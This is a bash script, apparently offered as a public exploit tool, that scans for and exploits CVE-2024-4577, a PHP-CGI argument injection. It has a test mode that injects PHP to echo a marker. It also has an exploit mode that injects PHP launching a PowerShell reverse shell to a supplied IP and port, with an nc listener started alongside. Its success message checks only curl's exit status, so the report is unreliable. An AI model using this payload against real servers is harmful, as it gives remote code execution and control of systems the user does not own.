#!/bin/bash
# Creator: @PatxaSec

function cve_test() {
  local url="$1"
  if [[ -z "$url" ]]; then
    echo "Error: URL not provided"
    return 1
  fi

  local output
  output=$(curl -X POST -k -s "$url?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
    --header 'User-Agent: curl/8.3.0' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --header 'Connection: keep-alive' \
    --header 'Accept: */*' \
    --data '<?php echo "CVE_2024_4577_TEST";?>')

  echo "========================================================================================"
  if grep -q "CVE_2024_4577_TEST" <<< "$output"; then
    echo "[+] The URL $url is vulnerable to CVE-2024-4577 (allow_url_include and auto_prepend_file)"
  else
    echo "[!] The URL $url is not vulnerable to CVE-2024-4577"
  fi
  echo "========================================================================================"
}

function cve_exploit() {
  url="$1"
  ip="$2"
  port=$3
  if [[ -z "$url" || -z "$ip" || -z "$port" ]]; then
    echo "Error: URL, IP, or port not provided"
    return 1
  fi
  output=$(curl -X POST -k -s "$url?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
    --header 'User-Agent: curl/8.3.0' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --header 'Connection: keep-alive' \
    --header 'Accept: */*' \
    --data '<?php exec("powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");?>')

  if [[ $? -eq 0 ]]; then
    echo "[+] Exploitation successful. Reverse shell established on $ip:$port"
  else
    echo "[!] Exploitation failed"
  fi
}

function usage() {
  echo "Usage: $0 <URL>   or   $0 <URL> <IP> <PORT>"
  echo "Example: $0 http://example.com   or   $0 http://example.com 192.168.1.100 4444"
  exit 1
}

if [[ $# -eq 1 ]]; then
  echo "Scanning..."
  cve_test "$1"
elif [[ $# -eq 3 ]]; then
  echo "Trying to get cmd..."
  nc -lnvp "$3" &
  echo "Exploiting..."
  cve_exploit "$1" "$2" "$3"
else
  usage
fi